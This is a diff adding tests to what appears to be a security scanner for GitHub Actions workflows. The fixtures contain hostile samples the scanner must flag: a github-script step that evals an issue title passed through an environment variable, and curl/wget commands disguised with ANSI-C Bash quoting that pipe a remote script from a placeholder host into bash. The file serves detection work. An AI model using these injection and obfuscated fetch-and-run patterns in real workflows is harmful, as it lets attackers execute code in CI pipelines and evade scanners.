@@ -419,3 +419,23 @@ test('Codex P1: shell concatenated quoted downloader names never certify clean',
   assert.ok(result.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE')||result.coverage.partial,JSON.stringify({downloader,result}));
  }
 });
+
+test('Codex P1: github-script cannot eval attacker-sourced environment data',()=>{
+ for(const sink of ['eval(process.env.CMD)',"new Function(process.env.CMD)()"]){
+  const src=['on: issues','jobs:','  audit:','    steps:',
+   '      - uses: actions/github-script@'+SHA,
+   '        env:','          CMD: ${{ github.event.issue.title }}',
+   '        with:','          script: '+sink].join('\n');
+  const v=inspectWorkflow(src);
+  assert.notEqual(v.status,'NO_RISK_PATTERN',JSON.stringify({sink,v}));
+  assert.ok(v.findings.some(f=>f.severity==='BLOCKER')||v.coverage.partial,JSON.stringify({sink,v}));
+ }
+});
+test('Codex P1: ANSI-C Bash quote segments cannot conceal remote downloader',()=>{
+ for(const downloader of ["c$''url","c$'u'rl","w$''get"]){
+  const src=['on: push','jobs:','  audit:','    steps:',
+   '      - run: '+downloader+' https://example.invalid/install | bash'].join('\n');
+  const v=inspectWorkflow(src);
+  assert.notEqual(v.status,'NO_RISK_PATTERN',JSON.stringify({downloader,v}));
+ }
+});
